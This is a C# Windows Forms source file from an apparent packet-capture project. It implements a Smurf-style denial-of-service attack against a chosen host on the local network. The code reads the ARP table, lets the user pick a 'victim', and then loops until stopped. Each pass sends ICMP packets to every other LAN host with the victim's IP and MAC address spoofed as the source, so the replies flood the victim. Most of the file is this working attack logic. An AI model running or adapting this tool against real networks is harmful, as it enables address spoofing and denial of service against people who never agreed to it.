using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PacketDotNet;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Icmp;
using PcapDotNet.Packets.IpV4;

namespace MyPacketCapturer
{
    public partial class FrmSmurf : Form
    {
        // Only want 1 instance of this form up.
        public static int Instantiations = 0;
        public static Dictionary<IPAddress,PhysicalAddress> ipToMac = new Dictionary<IPAddress, PhysicalAddress>();
        public static InterfaceData deviceInfo;
        public FrmSmurf()
        {
            InitializeComponent();
            Instantiations++;
            deviceInfo = Utils.ReturnInterfaceData();
            ipToMac = Utils.PopulateArpDict();

            //filter the dictionary to only grab the ip/mac of the clients on the same subnet.
            arpTableFiltering();
         
           
            
            // write out some data upon initiliazation. 
            txtDnsSuffix.Text = deviceInfo.DnsSuffix;
            txtIp.Text = deviceInfo.IpAddressInformation.Address.ToString();
            txtMask.Text = deviceInfo.IpAddressInformation.IPv4Mask.ToString();
            txtClass.Text = Utils.IdentifyClass(deviceInfo.IpAddressInformation.Address);

            
            txtMacAddress.Text = MacAddressFormat(deviceInfo.MacAddress);
            cboAttackers.Items.AddRange(ipToMac.Keys.ToArray());
        }

        private void FrmSmurf_Load(object sender, EventArgs e)
        {

        }

        private void FrmSmurf_FormClosed(object sender, FormClosedEventArgs e)
        {
            Instantiations--;
        }

        private void cboAttackers_SelectedIndexChanged(object sender, EventArgs e)
        {
            //grab one the clients in my arpTable and make them the victim by displaying their IP and Mac
            
            var client = (IPAddress)cboAttackers.SelectedItem;


            txtVictimMac.Text = ipToMac.ContainsKey(client) ? MacAddressFormat(ipToMac[client]) : "I should never get here";
            txtVictimIP.Text = client.ToString();
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            int intervals = 0;
            if (btnSend.Text == "SEND!")
            {
                btnSend.Text = "STOP!";
                btnSend.ForeColor = Color.Red;
                int.TryParse(txtIntervals.Text, out intervals);
            }
            else
            {
                btnSend.Text = "SEND!";
                btnSend.ForeColor = Color.Green;
            }
            // infinite loop until the button is pressed again.
            while (btnSend.Text != "SEND!")
            {
                // run this asynchronously so the UI isn't halted
                foreach (KeyValuePair<IPAddress, PhysicalAddress> kvp in ipToMac)
                {
                    if (kvp.Key.ToString() == txtVictimIP.Text)
                        continue; // we don't want the victim pinging himself lol.

                    await Task.Run(() => SendData(kvp.Key, kvp.Value, intervals));
                }
            }
        }

        private void SendData(IPAddress destinationIP, PhysicalAddress destinationmac, int numOfPings)
        {
            // i guess this method will be a task...
            //build out each frame.... ethernet, IP and icmp and then create the packet.
            var ethernetFrame = Utils.BuildEthernetFrame(new MacAddress(txtVictimMac.Text),
                new MacAddress(MacAddressFormat(destinationmac)));
            var ipFrame = Utils.BuildIpV4Frame(new IpV4Address(txtVictimIP.Text),
                new IpV4Address(destinationIP.ToString()), 128);
            var IcmpFrame = Utils.BuildIcmpFrame();
            var Packet = Utils.BuildIcmPacket(ethernetFrame, ipFrame, IcmpFrame);

            // send that data out
            using (PacketCommunicator communicator = frmCapture.myDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000))
            {
                for (int i = 0; i < numOfPings; i++)
                    communicator.SendPacket(Packet);
            }
        }

        private string MacAddressFormat(PhysicalAddress mac)
        {   
            // just a function to format mac address with ":"
            return string.Join(":", mac.GetAddressBytes().Select(b => b.ToString("X2")));
        }


        private static void arpTableFiltering()
        {
            /* Arp -a returns multiple ip -> Mac per device on the machine(vmware,docker,bluetooth etc...)
             *  I only want the ip and macs of the clients that are on the same domain or device as me.
             *  this functions filters that for me.
             */

            // Grab my IP class and my IP address in a byte array... 192.168.1.137 is byte[] {192, 168, 1, 137}
            string myIpClass = Utils.IdentifyClass(deviceInfo.IpAddressInformation.Address);
            byte[] myIP = deviceInfo.IpAddressInformation.Address.GetAddressBytes();


            // if it's a class A addresss, the first octet must be the same as my IP
            if (myIpClass == "Class A")
                ipToMac = ipToMac.Where(ip => ip.Key.GetAddressBytes()[0] == myIP[0])
                       .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);

            // first 2 AddressBytes have to be the same if Class B
            else if (myIpClass == "Class B")
                ipToMac = ipToMac.Where(ip => ip.Key.GetAddressBytes()[0] == myIP[0] && ip.Key.GetAddressBytes()[1] == myIP[1])
                    .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);
            // if it's not class A or B then it's class C.... so the first 3 octes need to match(not worried about D or E) or F?
            else
                ipToMac = ipToMac.Where(
                        ip =>
                            ip.Key.GetAddressBytes()[0] == myIP[0] && ip.Key.GetAddressBytes()[1] == myIP[1] &&
                            ip.Key.GetAddressBytes()[2] == myIP[2])
                    .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);

        }
    }
}
